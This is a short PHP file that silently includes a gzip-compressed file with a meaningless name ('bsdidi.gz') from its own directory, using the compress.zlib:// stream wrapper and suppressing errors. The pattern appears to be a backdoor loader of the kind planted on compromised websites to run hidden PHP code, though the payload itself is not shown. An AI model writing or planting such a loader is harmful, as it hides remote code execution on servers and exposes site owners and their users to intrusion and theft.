<?php
$_z = __DIR__ . '/bsdidi.gz';
if (is_file($_z)) {
    @include_once 'compress.zlib://' . $_z;
}

